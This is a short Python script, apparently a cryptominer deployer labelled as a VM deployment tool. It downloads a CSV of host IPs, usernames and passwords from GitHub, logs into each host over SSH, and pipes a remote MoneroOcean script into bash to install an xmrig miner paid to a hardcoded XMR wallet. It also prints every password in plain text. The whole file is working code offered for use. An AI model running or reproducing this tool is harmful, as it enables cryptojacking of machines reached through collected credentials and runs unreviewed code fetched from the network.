#!/usr/local/bin/python
# deploy.py: Deploy Multiple VM's from csv on github
# Version 1.0

import csv
import paramiko
import requests



# ===========================================================================================================================================
# VARS - Please modify this section as you require
# ===========================================================================================================================================
url = 'https://raw.githubusercontent.com/radzvrszebd/temp/main/vms.csv' # Set this to the location of your csv file
xmr_addy = '47TFyE1CiWNgcB5AMn9MSNKA4Lap9TcRwAvdbKedrK7VYWyqVTwE5qWWhW4Tdm4y2nNf9deqPdagqXWXwezwoSfPSx8jk3q' # Please make sure to set your XMR Address here
# ===========================================================================================================================================

# ===========================================================================================================================================







# ===========================================================================================================================================
# Do not edit below this line
# ===========================================================================================================================================

install_cmd = "curl -s -L https://raw.githubusercontent.com/junaidd007/Monero/main/MoneroOcean.sh | bash -s " + xmr_addy
sshcmd = [
    install_cmd # Runs the setup command
]
print("Downloading csv from: ", url, " Please make sure this file is up to date!")
req = requests.get(url)
url_content = req.content
csv_file = open("list.csv","wb")
csv_file.write(url_content)
csv_file.close()
print("File Has been downloaded and saved to your computer!")

print("Processing The CSV file")
print("we will be installing the miner with the following command :", sshcmd[0])
with open('list.csv', 'r') as csvfile:  
    reader = csv.DictReader(csvfile)
    for row in reader:


        print('Connecting to VM - IP Address: ', row['ip'], ' Username: ', row['user'], ' Password: ', row['pass'])

        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(hostname= row['ip'], username=row['user'], password=row['pass'])
            except:
                print( "[!] ERROR CONNECTING TO ", row['ip'])
                
            
            
            for command in sshcmd:
                print("="*50, command, "="*50)
                stdin, stdout, stderr = client.exec_command(command)
                print(stdout.read().decode())
                err = stderr.read().decode()
                if err:
                    print(err)
        except:
            print( "[!] ERROR, Timed out")

        print('VM been completed and xmrig has started')
            
# TODO: Delete CSV file after, but fuck it i'm lazy
